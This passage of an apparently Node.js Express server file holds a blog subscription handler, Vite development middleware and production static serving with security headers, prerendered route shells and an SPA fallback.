    const email = sanitizePlainText(req.body?.email, 320);
    const blocked =
      rejectIfUnsafeText(name, "name") || rejectIfUnsafeText(email, "email");
    if (blocked) {
      return res.status(400).json({ success: false, error: blocked });
    }
    console.log("NEW BLOG SUBSCRIPTION:", name, email);

    try {
      if (isEmailConfigured()) {
        await sendSubscribeEmail(name, email);
      }
      res.status(200).json({
        success: true,
        message: "Successfully subscribed to the intelligence stream.",
      });
    } catch (error) {
      console.error("[Email] subscribe failed:", error);
      res.status(200).json({
        success: true,
        message: "Subscribed (notification email failed).",
      });
    }
  });

  if (!isProduction) {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: {
        middlewareMode: true,
        host: true,
        allowedHosts: true,
        hmr: {
          clientPort: PORT,
        },
      },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const indexPath = path.join(distPath, "index.html");

    if (!fs.existsSync(indexPath)) {
      console.error(
        `[PROD] Missing ${indexPath}. Run "npm run build" before "npm start".`
      );
      process.exit(1);
    }

    try {
      assertDistHasNoPhpArtifacts(distPath);
    } catch (err) {
      console.error(err instanceof Error ? err.message : err);
      process.exit(1);
    }

    const health = getHealthEmailPayload();
    console.log(`[PROD] Mode: production`);
    console.log(`[PROD] Port: ${PORT}`);
    console.log(`[PROD] Static root: ${distPath}`);
    console.log(`[PROD] Email provider: ${health.emailProvider}`);
    console.log(`[PROD] Admin inbox: ${ADMIN_EMAIL}`);

    app.use(
      express.static(distPath, {
        index: false,
        dotfiles: "deny",
        fallthrough: true,
        setHeaders(res, filePath) {
          res.setHeader("X-Content-Type-Options", "nosniff");
          if (/\.txt$/i.test(filePath)) {
            res.setHeader("Content-Type", "text/plain; charset=utf-8");
            res.setHeader("Cache-Control", "public, max-age=3600");
          }
          if (/\.(php|phtml|phar|cgi)$/i.test(filePath)) {
            res.setHeader("Content-Type", "text/plain; charset=utf-8");
          }
        },
      })
    );

    /** IndexNow ownership proof — must be plain text at site root */
    app.get(/^\/[a-f0-9]{8,128}\.txt$/i, (req, res, next) => {
      const filePath = path.join(distPath, path.basename(req.path));
      if (!fs.existsSync(filePath)) return next();
      res.type("text/plain; charset=utf-8");
      res.setHeader("Cache-Control", "public, max-age=3600");
      res.sendFile(filePath);
    });

    app.get("/", (_req, res) => {
      res.sendFile(indexPath);
    });

    /** Prefer prerendered route shells (dist/{path}/index.html) for crawlers & direct hits */
    app.use((req, res, next) => {
      if (req.path.startsWith("/api")) return next();
      if (req.method !== "GET" && req.method !== "HEAD") return next();

      const clean = req.path.replace(/\/+$/, "") || "/";
      if (clean === "/") return next();

      const shellPath = path.join(distPath, clean.slice(1), "index.html");
      if (fs.existsSync(shellPath)) {
        res.setHeader("Cache-Control", "public, max-age=0, must-revalidate");
        return res.sendFile(shellPath);
      }
      next();
    });

    app.use((req, res, next) => {
      if (req.path.startsWith("/api")) {
        return next();
      }
      if (req.method !== "GET" && req.method !== "HEAD") {
        return next();
      }
      res.sendFile(indexPath, (err) => {
        if (err) {
          console.error(`[ERROR] Failed to send index.html for ${req.url}:`, err);
          res.status(500).send("Application load error (index.html not found).");
        }
      });
    });

    app.use("/api", (_req, res) => {
      res.status(404).json({ error: "API route not found" });
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(
      `[SERVER] ${isProduction ? "Production" : "Development"} listening on port ${PORT}`
    );
  });
}

startServer();
